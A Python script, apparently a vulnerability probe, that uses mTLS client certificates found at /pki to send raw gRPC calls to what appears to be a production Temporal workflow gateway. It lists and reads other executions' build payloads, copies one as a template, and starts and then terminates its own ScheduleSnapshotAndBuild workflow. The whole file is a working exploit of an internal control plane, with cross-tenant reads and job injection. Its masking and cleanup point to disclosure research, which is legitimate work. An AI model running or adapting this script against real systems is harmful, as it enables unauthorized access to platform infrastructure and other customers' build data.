#!/usr/bin/env python3
# I68441: (A) read-only replay of a *platform's own successful* ScheduleSnapshotAndBuild input payload
#        -> dump metadata (encoding) + JSON field tree (masked)
#        (B) local self-check of our metadata-correct payload
#        (C) ONE real delivery to our own project/service with metadata=json/plain, poll history,
#            terminate IMMEDIATELY on ActivityTaskScheduled. Never waits for build/publish.
import subprocess, struct, json, sys, os, time, re, uuid

G = 'https://external-mtls-service-gateway-us-west1.gcp.production.rlwy.net'
CA = '/pki/server-ca-bundle.crt'; CRT = '/pki/client.crt'; KEY = '/pki/client.key'
T = '/temporal.api.workflowservice.v1.WorkflowService/'
TS = time.strftime('%Y%m%dT%H%M%SZ', time.gmtime())
CTR = [0]
BUDGET = [56000]
NS = 'builds'; QUEUE = 'orchestrator'

OUR_P = '104cdfa2-f46b-45ed-b2b9-ec4db24b1b3f'
OUR_E = '6bd910b8-f1f5-43e5-b497-5bc2a4c55e3d'
OUR_S = '185f72a5-3373-41c1-982c-2af89c6e1191'
OUR_D = '55deb5ab-5055-4a5d-ab70-acafceaefd04'
COMMIT = '2add1df1d1bd2f34703c4a1dd6935430cd7dc684'
MARK = 'I68441-9c1d'

ET = {1: 'WfStarted', 2: 'WfCompleted', 3: 'WfFailed', 4: 'WfTimedOut', 5: 'WfTaskScheduled',
      6: 'WfTaskStarted', 7: 'WfTaskCompleted', 8: 'WfTaskTimedOut', 9: 'WfTaskFailed',
      10: 'ActScheduled', 11: 'ActStarted', 12: 'ActCompleted', 13: 'ActFailed', 14: 'ActTimedOut',
      15: 'TimerStarted', 16: 'TimerFired', 24: 'WfTerminated', 26: 'ChildInitiated',
      27: 'ChildInitFailed', 28: 'ChildStarted', 29: 'ChildCompleted', 30: 'ChildFailed',
      32: 'ChildTimedOut', 33: 'SignalExternalInitiated', 34: 'SignalExternalSucceeded'}
SENS = re.compile(r'(token|secret|password|key|credential|accesskey|bucket|codeuri|store)', re.I)


def varint(n):
    o = bytearray()
    while True:
        b = n & 0x7f; n >>= 7
        if n: o.append(b | 0x80)
        else: o.append(b); return bytes(o)


def fv(f, n): return varint(f << 3) + varint(n)
def fb(f, b): return varint((f << 3) | 2) + varint(len(b)) + b
def fs(f, s): return fb(f, s.encode() if isinstance(s, str) else s)
def fmsg(f, m): return fb(f, m)


def rd_varint(b, i):
    r = 0; s = 0
    while i < len(b):
        x = b[i]; r |= (x & 0x7f) << s; i += 1
        if not x & 0x80: return r, i
        s += 7
    raise ValueError('v')


def parse(b):
    i = 0; out = []
    while i < len(b):
        k, i = rd_varint(b, i); f = k >> 3; w = k & 7
        if f == 0: raise ValueError('f0')
        if w == 0:
            v, i = rd_varint(b, i); out.append((f, 0, v))
        elif w == 2:
            l, i = rd_varint(b, i)
            if i + l > len(b): raise ValueError('len')
            out.append((f, 2, b[i:i + l])); i += l
        elif w == 5: out.append((f, 5, b[i:i + 4])); i += 4
        elif w == 1: out.append((f, 1, b[i:i + 8])); i += 8
        else: raise ValueError('wt')
    return out


def call(path, body=b'', timeout=25):
    CTR[0] += 1
    fu = '/tmp/w%d.bin' % CTR[0]; hu = '/tmp/wh%d.txt' % CTR[0]; bu = '/tmp/wb%d.bin' % CTR[0]
    with open(fu, 'wb') as fh:
        fh.write(b'\x00' + struct.pack('>I', len(body)) + body)
        fh.flush(); os.fsync(fh.fileno())
    subprocess.run(['curl', '-sS', '--http2', '--connect-timeout', '6', '-m', str(timeout), '-D', hu, '-o', bu,
                    '--cert', CRT, '--key', KEY, '--cacert', CA, '-X', 'POST', G + path,
                    '-H', 'te: trailers', '-H', 'content-type: application/grpc', '--data-binary', '@' + fu],
                   capture_output=True, text=True)
    hdr = open(hu, 'rb').read().decode('utf-8', 'replace') if os.path.exists(hu) else ''
    sts = re.findall(r'grpc-status:\s*(\d+)', hdr)
    msgs = re.findall(r'grpc-message:\s*([^\r\n]*)', hdr)
    data = open(bu, 'rb').read() if os.path.exists(bu) else b''
    for f in (fu, hu, bu):
        try: os.unlink(f)
        except Exception: pass
    return {'st': sts[-1] if sts else '-', 'msg': msgs[-1].strip()[:200] if msgs else '',
            'data': data, 'n': len(data)}


def payload(b):
    if len(b) >= 5 and b[0] == 0:
        return b[5:5 + struct.unpack('>I', b[1:5])[0]]
    return b


def out(s):
    if BUDGET[0] <= 0: return
    s = s[:BUDGET[0]]; BUDGET[0] -= len(s)
    print(s, flush=True)


def g1(b, field):
    try:
        for f, w, v in parse(b):
            if f == field and w == 2: return v
    except Exception: return None
    return None


def g1v(b, field):
    try:
        for f, w, v in parse(b):
            if f == field and w == 0: return v
    except Exception: return None
    return None


def all_of(b, field):
    try: return [v for f, w, v in parse(b) if f == field and w == 2]
    except Exception: return []


def txt(b, lim=400):
    return ' '.join(x.decode('utf-8', 'replace') for x in re.findall(rb'[\x20-\x7e]{3,}', b))[:lim]


def dur(s): return fv(1, s)
def exm(wid, rid=''): return fs(1, wid) + (fs(2, rid) if rid else b'')


def decode_payload(pl):
    """Payload{b1: map<string,bytes> metadata, b2: bytes data} -> (meta dict, raw data)"""
    meta = {}
    data = b''
    for f, w, v in parse(pl):
        if f == 1 and w == 2:
            k = b''; val = b''
            for ff, ww, vv in parse(v):
                if ff == 1 and ww == 2: k = vv
                elif ff == 2 and ww == 2: val = vv
            meta[k.decode('utf-8', 'replace')] = val.decode('utf-8', 'replace')
        elif f == 2 and w == 2:
            data = v
    return meta, data


def tree(o, depth=0, maxd=4):
    """structure-only dump: keys + types + value length (mask long/sensitive)."""
    pad = '  ' * depth
    if isinstance(o, dict):
        parts = []
        for k, v in o.items():
            if isinstance(v, (dict, list)):
                parts.append('%s%s:\n%s' % (pad, k, tree(v, depth + 1, maxd)))
            else:
                sv = ''
                if isinstance(v, str):
                    sv = ('len=%d' % len(v)) if (SENS.search(k) or len(v) > 24) else repr(v)
                else:
                    sv = repr(v)[:40]
                parts.append('%s%s=%s(%s)' % (pad, k, type(v).__name__, sv))
        return '\n'.join(parts)
    if isinstance(o, list):
        if not o: return pad + '[]'
        return '%s[%d items] first:\n%s' % (pad, len(o), tree(o[0], depth + 1, maxd))
    return pad + repr(o)[:40]


def hist_page(wid, rid, size=20, tok=b''):
    req = fs(1, NS) + fmsg(2, exm(wid, rid)) + fv(3, size)
    if tok: req += fmsg(4, tok)
    return call(T + 'GetWorkflowExecutionHistory', req, timeout=30)


def events_of(r):
    pl = payload(r['data'])
    h = g1(pl, 1) or b''
    return [v for f, w, v in parse(h) if f == 1 and w == 2], (g1(pl, 3) or b'')


def ev_type(ev): return g1v(ev, 3) or 0


def ev_seq(wid, rid):
    r = hist_page(wid, rid, 30)
    if r['st'] != '0': return None
    evs, tok = events_of(r)
    return [ev_type(e) for e in evs]


def start_body(wid, wtype, tq, inp, etime=120, rtime=120, wtime=10):
    data = json.dumps(inp, separators=(',', ':')).encode()
    pl = fmsg(1, fs(1, 'encoding') + fs(2, 'json/plain')) + fmsg(2, data)
    b = fs(1, NS) + fs(2, wid) + fmsg(3, fs(1, wtype)) + fmsg(4, fs(1, tq))
    b += fmsg(5, fmsg(1, pl))
    b += fmsg(6, dur(etime)) + fmsg(7, dur(rtime)) + fmsg(8, dur(wtime))
    b += fs(9, 'i68441-probe') + fs(10, str(uuid.uuid4())) + fv(11, 2)
    return b


LASTTOK = [b'']


def list_execs(n=100, tok=b'', query=''):
    req = fs(1, NS) + fv(2, n)
    if tok: req += fmsg(3, tok)
    if query: req += fs(4, query)
    r = call(T + 'ListWorkflowExecutions', req, timeout=30)
    res = []
    LASTTOK[0] = b''
    if r['st'] != '0':
        out('LS|st=%s|m=%s' % (r['st'], r['msg'])); return res
    pl = payload(r['data'])
    LASTTOK[0] = g1(pl, 2) or b''
    for ei in all_of(pl, 1):
        ex = g1(ei, 1) or b''
        wid = (g1(ex, 1) or b'').decode('utf-8', 'replace')
        rid = (g1(ex, 2) or b'').decode('utf-8', 'replace')
        ty = (g1(g1(ei, 2) or b'', 1) or b'').decode('utf-8', 'replace')
        status = g1v(ei, 5) or 0
        res.append({'wid': wid, 'rid': rid, 'type': ty, 'status': status})
    return res


def terminate(wid, rid, why):
    r = call(T + 'TerminateWorkflowExecution',
             fs(1, NS) + fmsg(2, exm(wid, rid)) + fs(3, why) + fs(5, 'i68441') + fs(6, rid), timeout=25)
    out('TERM|%s|st=%s|m=%s' % (wid[:46], r['st'], r['msg']))


def main():
    out('===I68441 START=== %s mark=%s' % (TS, MARK))
    out('host=%s' % subprocess.run(['hostname'], capture_output=True, text=True).stdout.strip())
    r = call(T + 'GetSystemInfo')
    out('CTL|GetSystemInfo|st=%s|%s' % (r['st'], txt(payload(r['data']), 50)))
    if r['st'] != '0':
        out('NOEGRESS'); out('===I68441 END==='); return

    # ---------- PHASE A: read-only ground truth from a platform's own successful execution ----------
    exs = list_execs(100)
    ssb = [e for e in exs if e['type'] == 'ScheduleSnapshotAndBuild' and not e['wid'].startswith(('i68', 'i684'))]
    pg = 1
    while len(ssb) < 2 and LASTTOK[0] and pg < 8:
        more = list_execs(100, LASTTOK[0]); pg += 1
        if not more: break
        exs += more
        ssb += [e for e in more if e['type'] == 'ScheduleSnapshotAndBuild' and not e['wid'].startswith(('i68', 'i684'))]
    out('EXECS=%d pages=%d SSB=%d STATUS=%s' %
        (len(exs), pg, len(ssb), ','.join(str(e['status']) for e in ssb[:20])))
    good = [e for e in ssb if e['status'] == 2] + [e for e in ssb if e['status'] != 2]
    out('SSB_COMPLETED=%d' % len([e for e in ssb if e['status'] == 2]))
    template = None
    for e in good[:4]:
        rr = hist_page(e['wid'], e['rid'], 10)
        if rr['st'] != '0':
            out('HIST|%s|st=%s' % (e['wid'][:40], rr['st'])); continue
        evs, _ = events_of(rr)
        if not evs: continue
        ev1 = evs[0]
        if ev_type(ev1) != 1: continue
        # empirical attribute-field mapping from a real history
        for e in evs[:14]:
            af = [(f, v) for f, w, v in parse(e) if 6 <= f <= 40 and w == 2]
            out('EVDUMP|t=%d|attrs=%s|%s' % (ev_type(e), ','.join(str(f) for f, _ in af),
                                             ' '.join(txt(v, 90) for _, v in af)[:260]))
        attrs = g1(ev1, 6)
        if not attrs: continue
        inputs = g1(attrs, 6)
        if not inputs: continue
        pl = all_of(inputs, 1)
        out('PL|%d payloads' % len(pl))
        for i, p in enumerate(pl):
            meta, data = decode_payload(p)
            out('META%d|%s' % (i, json.dumps(meta, ensure_ascii=False)[:400]))
            out('RAWLEN%d|%d' % (i, len(p)))
            if i == 0:
                try:
                    obj = json.loads(data.decode('utf-8'))
                    out('JSON_KEYS_TREE:\n' + tree(obj))
                    out('TOPKEYS|' + ','.join(obj.keys()))
                    template = obj
                except Exception as ex:
                    out('JSONERR|%r|%s' % (ex, txt(data, 300)))
        break

    if template:
        # summarize field-level controllability map (static, from observed shape)
        out('MAP|identifiers=' + ','.join((template.get('identifiers') or {}).keys()))
        for k in ('snapshotConfig', 'githubRepo', 'imageUploadTarget'):
            v = template.get(k)
            if isinstance(v, dict): out('MAP|%s=%s' % (k, ','.join(v.keys())))

    # ---------- PHASE B: build our payload from the observed template (same shape/casing) ----------
    import copy
    SNAP = str(uuid.uuid4())
    if template:
        inp = copy.deepcopy(template)
    else:
        inp = {}
    # identifiers: preserve observed key casing
    ids = inp.get('identifiers') or {}
    for k in list(ids.keys()):
        lk = k.lower()
        if lk == 'projectid': ids[k] = OUR_P
        elif lk == 'environmentid': ids[k] = OUR_E
        elif lk == 'serviceid': ids[k] = OUR_S
        elif lk == 'deploymentid': ids[k] = OUR_D
        elif lk == 'snapshotid': ids[k] = SNAP
    if not ids:
        ids = {'projectID': OUR_P, 'environmentID': OUR_E, 'serviceID': OUR_S,
               'deploymentID': OUR_D, 'snapshotID': SNAP}
    inp['identifiers'] = ids
    # snapshotConfig: keep shape, override rootDirectory + nested identifiers
    sc = inp.get('snapshotConfig')
    if not isinstance(sc, dict): sc = {}
    sc['rootDirectory'] = 'i68441'
    sid = sc.get('identifiers')
    if isinstance(sid, dict):
        for k in list(sid.keys()):
            lk = k.lower()
            if lk == 'projectid': sid[k] = OUR_P
            elif lk == 'environmentid': sid[k] = OUR_E
            elif lk == 'serviceid': sid[k] = OUR_S
            elif lk == 'deploymentid': sid[k] = OUR_D
            elif lk == 'snapshotid': sid[k] = SNAP
    if 'environmentPriority' not in sc: sc['environmentPriority'] = ['production']
    inp['snapshotConfig'] = sc
    # githubRepo: self repo, drop any credential
    gh = inp.get('githubRepo') if isinstance(inp.get('githubRepo'), dict) else {}
    gh['url'] = 'https://github.com/onepluspadtrading/buildctx-lab'
    gh['refOrCommitSha'] = COMMIT
    for k in list(gh.keys()):
        if 'token' in k.lower() or 'auth' in k.lower(): gh[k] = ''
    inp['githubRepo'] = gh
    inp['envVars'] = {'I68441_MARK': MARK}
    # imageUploadTarget: self repo/tag, keep field names observed
    iut = inp.get('imageUploadTarget')
    if isinstance(iut, dict):
        for k in list(iut.keys()):
            lk = k.lower()
            if 'repo' in lk or 'image' in lk or 'name' in lk: iut[k] = 'i68441-self/img'
            elif 'tag' in lk: iut[k] = MARK.lower()
    # builderMode / targetRegion: keep observed values when present, else sane defaults
    inp.setdefault('targetRegion', 'usw')
    if not template:
        inp.setdefault('railpack', {})
        inp.setdefault('limits', {})
        inp.setdefault('builderMode', 'BUILDER_MODE_V3')
        inp.setdefault('imageUploadTarget', {'repository': 'i68441-self/img', 'tag': MARK.lower()})
    # sanitize: never carry platform credentials or other-project object URIs into our execution
    def scrub(o):
        if isinstance(o, dict):
            for k in list(o.keys()):
                if re.search(r'(secret|password|accesskey|private|bearer|bucket|credential)', k, re.I):
                    del o[k]
                elif re.search(r'(codeuri|previouscodeuri)', k, re.I):
                    del o[k]
                else:
                    scrub(o[k])
        elif isinstance(o, list):
            for x in o: scrub(x)
    scrub(inp)
    out('DELIVER_TREE:\n' + tree(inp))
    wid = 'i68441-' + TS
    body = start_body(wid, 'ScheduleSnapshotAndBuild', QUEUE, inp)
    # self-check: parse our own request back
    try:
        top = parse(body)
        f5 = [v for f, w, v in top if f == 5 and w == 2][0]
        pls = parse(f5)
        p0 = [v for f, w, v in pls if f == 1 and w == 2][0]
        meta, data = decode_payload(p0)
        obj = json.loads(data.decode())
        out('SELFCHECK|st=OK|meta=%s|topkeys=%s|idkeys=%s' %
            (json.dumps(meta), ','.join(obj.keys()), ','.join(obj['identifiers'].keys())))
    except Exception as ex:
        out('SELFCHECK|st=FAIL|%r' % (ex,))

    # ---------- PHASE C: ONE real delivery, poll, terminate on activity ----------
    out('=== DELIVER %s ===' % wid)
    r = call(T + 'StartWorkflowExecution', body, timeout=30)
    out('START|st=%s|m=%s|len=%d' % (r['st'], r['msg'], r['n']))
    rid = ''
    if r['st'] == '0':
        try:
            rid = (g1(payload(r['data']), 1) or b'').decode()
        except Exception:
            rid = ''
    out('RUNID|%s' % rid)
    if not rid:
        out('DELIVER_FAILED_BEFORE_RUN'); out('===I68441 END==='); return

    t0 = time.time(); last = None; hit_act = False; done = False
    while time.time() - t0 < 300:
        rr = hist_page(wid, rid, 60)
        if rr['st'] != '0':
            time.sleep(5); continue
        evs, _ = events_of(rr)
        s = [ev_type(e) for e in evs]
        if s != last:
            last = list(s)
            out('EV|t=%.1f|%s' % (time.time() - t0, ','.join(ET.get(x, str(x)) for x in s)))
            # dump activity scheduled attributes once
            if 10 in s:
                for e in evs:
                    if ev_type(e) == 10:
                        at = g1(e, 15) or g1(e, 10) or b''
                        out('ACT|type=%s|tq=%s' % (txt(g1(at, 2) or b'', 80), txt(g1(at, 3) or b'', 80)))
                        ain = g1(at, 5) or g1(at, 4)
                        if ain:
                            for p in all_of(ain, 1):
                                mm, dd = decode_payload(p)
                                out('ACTMETA|%s' % json.dumps(mm)[:200])
                                out('ACTIN|' + dd.decode('utf-8', 'replace')[:1500])
                        break
                hit_act = True
            if 3 in s or 2 in s or 24 in s:
                done = True
        if hit_act:
            out('ACTIVITY_SCHEDULED => decoding correct, function executed')
            break
        if done:
            break
        time.sleep(5)

    if not hit_act:
        # capture failure text / tail
        try:
            for e in evs:
                t = ev_type(e)
                if t == 3:
                    fa = g1(e, 8) or g1(e, 7) or b''
                    fl = g1(fa, 1) or b''
                    out('FAILURE|' + txt(fl, 600))
                    out('FAILURE_RAW|' + fl.hex()[:600])
                elif t in (9, 14, 19):
                    out('EVFAIL%d|' % t + txt(e, 700))
        except Exception as ex:
            out('FAILDUMP_ERR|%r' % (ex,))
    # terminate our own execution immediately (always)
    terminate(wid, rid, 'i68441 self cleanup')
    time.sleep(1)
    s2 = ev_seq(wid, rid)
    out('POSTTERM|' + ','.join(ET.get(x, str(x)) for x in (s2 or [])))
    out('===I68441 END=== mark=%s hit_act=%s' % (MARK, hit_act))


if __name__ == '__main__':
    main()
